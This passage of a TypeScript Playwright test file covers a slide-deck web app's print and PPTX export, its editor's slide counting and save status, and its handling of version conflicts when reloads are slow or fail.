  const { id } = store.publish({ title: 'Print deck', files: { 'index.slides.md': { content: Buffer.from(DECK) } } })
  const viewer = await browser.newPage({ viewport: { width: 1200, height: 800 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  const page = viewer.frames().find((f) => f.url().includes(`:${CONTENT_PORT}/`))!
  // The PDF button prints from inside the sandbox (allowed by allow-modals).
  await page.evaluate(() => { (window as unknown as { print: () => void }).print = () => document.body.setAttribute('data-printed', '1') })
  await frame.locator('[data-deck="print"]').click()
  await frame.locator('body[data-printed="1"]').waitFor()
  await viewer.emulateMedia({ media: 'print' })
  const printed = await page.evaluate(() =>
    [...document.querySelectorAll('.slide')].map((slide) => {
      const style = getComputedStyle(slide)
      return { visible: style.visibility === 'visible', breaks: style.breakAfter === 'page' }
    })
  )
  assert.deepEqual(printed, [1, 2, 3].map(() => ({ visible: true, breaks: true })))
  assert.equal(await page.evaluate(() => getComputedStyle(document.querySelector('.deck-bar')!).display), 'none')
  await viewer.emulateMedia({ media: 'screen' })

  const link = viewer.locator('#export-pptx')
  assert.equal(await link.isVisible(), true)
  const [download] = await Promise.all([viewer.waitForEvent('download'), link.click()])
  assert.equal(download.suggestedFilename(), 'Print deck.pptx')
  await viewer.close()
})

test('the editor counts slides like the server, and text typed while a save is on its way stays unsaved', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const { id } = store.publish({ title: 'Editor edges', files: { 'index.slides.md': { content: Buffer.from('# A\n---\n???\n---\n## C\nlast') } } })
  const viewer = await browser.newPage({ viewport: { width: 1300, height: 800 } })
  await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
  const frame = viewer.frameLocator('#frame')
  await frame.locator('.slide.active').waitFor()
  assert.equal(await frame.locator('#deck-counter').textContent(), '1 / 2')
  await viewer.click('#edit')
  const source = viewer.locator('#editor-source')
  await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('last'))
  // The cursor in "## C" (the server's slide 2, after a notes-only chunk it drops) shows slide 2.
  await source.evaluate((el: HTMLTextAreaElement) => { el.focus(); el.setSelectionRange(el.value.length, el.value.length) })
  await viewer.keyboard.press('End')
  await frame.locator('.slide.active#slide-2').waitFor({ timeout: 3000 })

  // Hold the save on the wire, type meanwhile: the new text is not counted as saved.
  let release!: () => void
  const held = new Promise<void>((resolve) => { release = resolve })
  await viewer.route('**/slides', async (route) => {
    await held
    await route.continue()
  })
  await viewer.keyboard.type(' one')
  await viewer.keyboard.press('ControlOrMeta+s')
  await viewer.locator('#editor-status', { hasText: '儲存中' }).waitFor()
  await viewer.keyboard.type(' two')
  await viewer.keyboard.press('ControlOrMeta+s')
  release()
  await viewer.locator('#editor-status', { hasText: '未儲存' }).waitFor({ timeout: 5000 })
  assert.equal(store.requireSummary(id).currentVersion, 2)
  assert.match(store.blobs.read(store.requireVersion(id, 2).files['index.slides.md'].sha256).toString(), /last one$/)
  assert.equal(await viewer.locator('#save-deck').isEnabled(), true)
  await viewer.unroute('**/slides')
  await viewer.click('#save-deck')
  await viewer.locator('#editor-status', { hasText: '已存成 v3' }).waitFor({ timeout: 5000 })
  await viewer.close()
})

test('the editor never pairs old text with a newer base: typing during a reload, a failed reload, a slow open', { skip: !chromiumPath && 'no Chromium found' }, async () => {
  const source = (id: string, v: number) => store.blobs.read(store.requireVersion(id, v).files['index.slides.md'].sha256).toString()
  const scenario = async (name: string, run: (ctx: { viewer: import('playwright-core').Page; id: string }) => Promise<void>) => {
    const { id } = store.publish({ title: name, files: { 'index.slides.md': { content: Buffer.from('# v1 original\n') } } })
    const viewer = await browser.newPage({ viewport: { width: 1300, height: 800 } })
    await viewer.goto(`http://localhost:${APP_PORT}/a/${id}`)
    await viewer.frameLocator('#frame').locator('.slide.active').waitFor()
    await run({ viewer, id })
    // Whatever happened, saving must not silently replace v2.
    viewer.once('dialog', (dialog) => dialog.dismiss())
    await viewer.locator('#editor-source').press('End')
    await viewer.keyboard.type(' edit')
    await viewer.click('#save-deck')
    await viewer.waitForTimeout(800)
    const now = store.requireSummary(id).currentVersion
    assert.ok(now === 2 || source(id, now).startsWith('# v2'), `${name}: v${now} = ${JSON.stringify(source(id, now))}`)
    await viewer.close()
  }
  const hold = async (viewer: import('playwright-core').Page, version: number, answer: 'continue' | 'fail') => {
    let release!: () => void
    const held = new Promise<void>((resolve) => { release = resolve })
    let seen!: () => void
    const requested = new Promise<void>((resolve) => { seen = resolve })
    await viewer.route((url) => url.pathname.endsWith('/files/index.slides.md') && url.searchParams.get('v') === String(version), async (route) => {
      seen()
      await held
      if (answer === 'fail') await route.fulfill({ status: 503, body: 'down' })
      else await route.continue()
    })
    return { requested, release }
  }

  await scenario('typing during reload', async ({ viewer, id }) => {
    await viewer.click('#edit')
    await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('v1'))
    const gate = await hold(viewer, 2, 'continue')
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await gate.requested
    await viewer.locator('#editor-source').press('End')
    await viewer.keyboard.type(' TYPED')
    gate.release()
    await viewer.waitForTimeout(500)
    assert.match(await viewer.locator('#editor-source').inputValue(), /TYPED/)
  })

  await scenario('failed reload', async ({ viewer, id }) => {
    await viewer.click('#edit')
    await viewer.waitForFunction(() => (document.getElementById('editor-source') as HTMLTextAreaElement).value.includes('v1'))
    const gate = await hold(viewer, 2, 'fail')
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await gate.requested
    gate.release()
    await viewer.waitForTimeout(500)
  })

  await scenario('slow open', async ({ viewer, id }) => {
    const gate = await hold(viewer, 1, 'continue')
    await viewer.click('#edit')
    await gate.requested
    store.update(id, { files: { 'index.slides.md': { content: Buffer.from('# v2 by publisher\n') } } })
    await viewer.waitForFunction(() => document.querySelector<HTMLSelectElement>('#version')!.options.length === 2)
    gate.release()
    await viewer.waitForTimeout(500)
  })
})
